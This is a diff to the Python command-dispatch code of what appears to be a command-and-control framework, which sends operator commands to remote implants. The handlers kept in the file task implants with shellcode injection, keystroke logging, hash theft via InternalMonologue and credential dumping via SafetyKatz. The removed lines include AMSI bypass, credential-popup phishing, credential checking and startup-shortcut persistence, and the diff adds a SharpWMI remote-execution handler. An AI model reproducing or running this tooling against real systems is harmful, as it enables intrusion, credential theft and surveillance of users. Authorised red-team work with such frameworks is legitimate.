@@ -46,9 +46,6 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     elif command.startswith("upload-file"):
         do_upload_file(user, command, randomuri)
         return
-    elif command == "bypass-amsi":
-        do_bypass_amsi(user, command, randomuri)
-        return
     elif command.startswith("inject-shellcode"):
         do_inject_shellcode(user, command, randomuri)
         return
@@ -70,86 +67,17 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     elif (command.startswith("get-keystrokes")):
         do_get_keystrokes(user, command, randomuri)
         return
-    elif (command.startswith("start-process")):
-        do_start_process(user, command, randomuri)
-        return
-    elif (command.startswith("kill-process")):
-        do_kill_process(user, command, randomuri)
-        return
-    elif (command.startswith("get-idletime")):
-        do_get_idletime(user, command, randomuri)
-        return
     elif (command.startswith("get-screenshotmulti")):
         do_get_screenshotmulti(user, command, randomuri)
         return
-    elif (command.startswith("create-lnk")):
-        do_create_lnk(user, command, randomuri)
-        return
-    elif (command.startswith("create-startuplnk")):
-        do_create_startuplnk(user, command, randomuri)
+    elif command.startswith("run-exe SharpWMI.Program") and "execute" in command and "payload" not in command:
+        do_sharpwmi_execute(user, command, randomuri)
         return
     elif (command.startswith("get-hash")):
         do_get_hash(user, command, randomuri)
         return
-    elif (command.startswith("arpscan")):
-        do_arpscan(user, command, randomuri)
-        return
-    elif (command.startswith("testadcredential")):
-        do_testadcredential(user, command, randomuri)
-        return
-    elif (command.startswith("testlocalcredential")):
-        do_testlocalcredential(user, command, randomuri)
-        return
-    elif (command.startswith("turtle")):
-        do_turtle(user, command, randomuri)
-        return
-    elif (command.startswith("get-userinfo")):
-        do_getuserinfo(user, command, randomuri)
-        return
-    elif (command.startswith("get-computerinfo")):
-        do_get_computerinfo(user, command, randomuri)
-        return
-    elif (command.startswith("get-dodgyprocesses")):
-        do_get_dodgyprocesses(user, command, randomuri)
-        return
-    elif (command.startswith("get-content")):
-        do_get_content(user, command, randomuri)
-        return
-    elif (command.startswith("resolvednsname")):
-        do_resolvednsname(user, command, randomuri)
-        return
-    elif (command.startswith("resolveip")):
-        do_resolveip(user, command, randomuri)
-        return
     elif (command.startswith("safetykatz")):
         do_safetykatz(user, command, randomuri)
-        return
-    elif (command.startswith("get-creds")):
-        do_get_creds(user, command, randomuri)
-        return
-    elif (command.startswith("cred-popper")):
-        do_cred_popper(user, command, randomuri)
-        return
-    elif (command.startswith("get-serviceperms")):
-        do_get_serviceperms(user, command, randomuri)
-        return
-    elif (command.startswith("copy ")):
-        do_copy(user, command, randomuri)
-        return
-    elif (command.startswith("move ")):
-        do_move(user, command, randomuri)
-        return
-    elif (command.startswith("delete ")):
-        do_delete(user, command, randomuri)
-        return
-    elif command.startswith("ls ") or command.startswith("ls-recurse "):
-        do_ls(user, command, randomuri)
-        return
-    elif command == "pwd":
-        do_pwd(user, command, randomuri)
-        return
-    elif command == "ps":
-        do_ps(user, command, randomuri)
         return
     elif command.startswith("loadmoduleforce"):
         do_loadmoduleforce(user, command, randomuri)
@@ -190,7 +118,6 @@ def do_upload_file(user, command, randomuri):
     # TODO lots of common code
     source = ""
     destination = ""
-    s = ""
     if command == "upload-file":
         style = Style.from_dict({
             '': '#80d130',
@@ -219,10 +146,6 @@ def do_upload_file(user, command, randomuri):
     except Exception as e:
         print("Error with source file: %s" % e)
         traceback.print_exc()
-
-
-def do_bypass_amsi(user, command, randomuri):
-    new_task("run-exe Core.Program Core bypass-amsi", user, randomuri)
 
 
 def do_inject_shellcode(user, command, randomuri):
@@ -323,29 +246,9 @@ def do_get_keystrokes(user, command, randomuri):
     new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
 
 
-def do_start_process(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_kill_process(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_get_idletime(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
 def do_get_screenshotmulti(user, command, randomuri):
     new_task(command, user, randomuri)
     update_label("SCREENSHOT", randomuri)
-
-
-def do_create_lnk(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_create_startuplnk(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
 
 def do_get_hash(user, command, randomuri):
@@ -353,85 +256,8 @@ def do_get_hash(user, command, randomuri):
     new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
 
 
-def do_arpscan(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_testadcredential(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    return
-
-
-def do_testlocalcredential(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_turtle(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_getuserinfo(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_get_computerinfo(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_get_dodgyprocesses(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-
-
-def do_get_content(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_resolvednsname(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_resolveip(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
 def do_safetykatz(user, command, randomuri):
     new_task("run-exe SafetyKatz.Program %s" % command, user, randomuri)
-
-
-def do_get_creds(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_cred_popper(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_get_serviceperms(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_copy(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)
-    
-
-def do_move(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)    
-
-
-def do_delete(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)    
-
-
-def do_ls(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)    
-
-
-def do_pwd(user, command, randomuri):
-    new_task("run-exe Core.Program Core %s" % command, user, randomuri)    
-
-
-def do_ps(user, command, randomuri):
-    new_task("run-exe Core.Program Core Get-ProcessList", user, randomuri)    
 
 
 def do_loadmoduleforce(user, command, randomuri):
@@ -454,7 +280,7 @@ def do_listmodules(user, command, randomuri):
     print("")
     for mod in modules:
         if (".exe" in mod) or (".dll" in mod):
-            print(mod)     
+            print(mod)
 
 
 def do_modulesloaded(user, command, randomuri):
